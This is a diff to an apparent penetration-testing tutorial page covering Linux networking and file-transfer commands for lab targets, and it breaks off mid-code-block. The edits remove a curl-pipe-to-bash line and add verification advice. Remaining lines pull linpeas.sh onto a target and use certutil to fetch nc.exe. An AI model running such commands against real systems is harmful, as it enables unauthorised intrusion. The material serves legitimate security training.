@@ -49,8 +49,7 @@ nohup long_command &        # run detached from the terminal (survives logout)`}
 ifconfig                  # legacy equivalent
 ip route                  # routing table
 ping -c 4 10.10.10.5       # 4 ICMP echo requests`}</CodeBlock>
-      <CodeBlock label="what's listening / connected">{`netstat -tulpn            # listening TCP/UDP ports + owning process (needs root for PID)
-ss -tulpn                  # modern replacement for netstat, faster and lower-overhead
+      <CodeBlock label="what's listening / connected">{`ss -tulpn                  # current TCP/UDP listeners; process detail depends on permissions
 ss -t state established     # only currently-established TCP connections — see who you're actually talking to
 lsof -i :443                # what process owns port 443
 lsof -p 1234                 # every file/socket a specific PID has open`}</CodeBlock>
@@ -67,10 +66,11 @@ curl -sI http://10.10.10.5    # headers only (-I / --head) — quick tech-stack 
 wget http://10.10.10.5/x.sh  # download a file
 scp file.txt user@10.10.10.5:/tmp/   # copy a file over SSH`}</CodeBlock>
       <p>
-        <code>/etc/hosts</code> is worth knowing about too — it's checked before DNS on every Linux (and
-        Windows) box, so adding a line like <code>10.10.10.5  target.local</code> there lets you reach a
-        lab target by name even with no real DNS record for it, which matters once you start working with
-        HTTP virtual hosts that key off the <code>Host</code> header.
+        <code>/etc/hosts</code> provides local name mappings when the configured system resolver uses it.
+        Linux lookup order is controlled by name-service configuration such as <code>/etc/nsswitch.conf</code>;
+        applications can also use their own resolvers. Compare <code>getent hosts target.test</code> with
+        <code>dig target.test</code> before assuming both consult the same source. Prefer a deliberately
+        configured <code>.test</code> lab name; <code>.local</code> has multicast-DNS semantics.
       </p>
 
       <h2>Redirection &amp; piping — the glue of every one-liner</h2>
@@ -86,11 +86,18 @@ nmap -oN scan.txt 10.10.10.5    # nmap's own flag for saving normal-format outpu
         onto the target, or loot back off it. The tool that's actually available differs box to box, so
         knowing several equivalent methods matters more than memorizing one.
       </p>
-      <CodeBlock label="serving files from your attack box">{`python3 -m http.server 8000          # instantly serves the current directory over HTTP
-python -m SimpleHTTPServer 8000       # the same, on a target's ancient Python 2`}</CodeBlock>
+      <CodeBlock label="serving a harmless local fixture">{`python3 -m http.server 8000 --bind 127.0.0.1   # serves this directory only on local loopback`}</CodeBlock>
+      <p>
+        Use an empty directory or a designated harmless fixture directory. Python 2's SimpleHTTPServer
+        appears in old tutorials; current practice uses Python 3. For guest-to-guest practice, choose the
+        intended lab-interface binding deliberately. This development server provides no production
+        authentication or TLS; use SFTP for authenticated file transfer between accounts you control.
+      </p>
       <CodeBlock label="pulling files onto a Linux target">{`wget http://10.10.10.5:8000/linpeas.sh -O /tmp/linpeas.sh
 curl http://10.10.10.5:8000/linpeas.sh -o /tmp/linpeas.sh
-curl http://10.10.10.5:8000/linpeas.sh | bash          # fetch and execute in one step`}</CodeBlock>
+sha256sum /tmp/linpeas.sh                            # compare with an authenticated expected digest
+# Inspect the source, dependencies and intended actions before execution.
+# Downloading a file does not make it trustworthy.`}</CodeBlock>
       <CodeBlock label="the Windows equivalents you'll meet on mixed-OS engagements">{`certutil.exe -urlcache -f http://10.10.10.5:8000/nc.exe nc.exe   # a genuine LOLBin —
                                                                     # a signed Windows binary abused for
                                                                     # an unintended purpose (fetching files)
